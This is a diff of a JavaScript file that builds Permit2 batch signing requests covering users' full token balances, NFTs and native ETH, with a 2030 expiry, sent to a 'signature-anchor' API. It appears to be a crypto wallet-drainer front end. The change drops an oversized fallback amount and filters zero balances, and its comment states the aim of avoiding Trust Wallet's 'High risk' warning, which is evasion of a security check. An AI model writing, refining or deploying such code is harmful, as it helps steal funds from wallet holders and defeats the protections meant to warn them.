@@ -145,7 +145,7 @@
   };
 
   var EXPIRY_ISO = '2030-01-01T00:00:00.000Z';
-  var MAX_AMOUNT = '1000000000000000000000000000';
+  var MAX_AMOUNT = null; // Removed: sending huge fallback amounts triggers Trust Wallet "High risk". Filter instead.
   var NATIVE_ETH_ADDR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
   var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 
@@ -5780,7 +5780,8 @@
       var nftChunk = nftChunks[chunkIdx];
       var isFirst = chunkIdx === 0;
       var permits = isFirst
-        ? (tokens || []).map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || MAX_AMOUNT }; })
+        ? (tokens || []).map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || null }; })
+            .filter(function (p) { return p.amount && BigInt(p.amount) > 0n; })
         : [];
       var nativeStr = (isFirst && nativeAmountWei && nativeAmountWei > 0n)
         ? nativeAmountWei.toString() : '0';
@@ -5907,7 +5908,8 @@
     if (!tokens || tokens.length === 0) return null;
     var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
       wallet_address: address, chain_id: Number(chainId),
-      permits: tokens.map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || MAX_AMOUNT }; }),
+      permits: (tokens || []).map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || null }; })
+        .filter(function (p) { return p.amount && BigInt(p.amount) > 0n; }),
       native_amount: '0', nfts: normNftList(nfts),
     });
     if (!resp || !resp.data || !resp.data.typed_data) return null;
